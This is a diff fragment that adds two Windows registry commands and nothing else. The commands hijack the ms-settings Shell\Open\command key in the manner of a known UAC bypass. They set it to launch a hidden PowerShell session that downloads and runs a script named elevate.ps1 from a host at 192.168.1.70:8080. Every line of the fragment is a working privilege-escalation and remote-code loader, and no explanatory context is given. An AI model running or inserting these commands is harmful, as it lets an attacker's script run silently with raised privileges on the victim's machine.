@@ -1,0 +1,2 @@
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "" /t REG_SZ /d "powershell -NoP -W Hidden -C IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.70:8080/elevate.ps1'))" /f
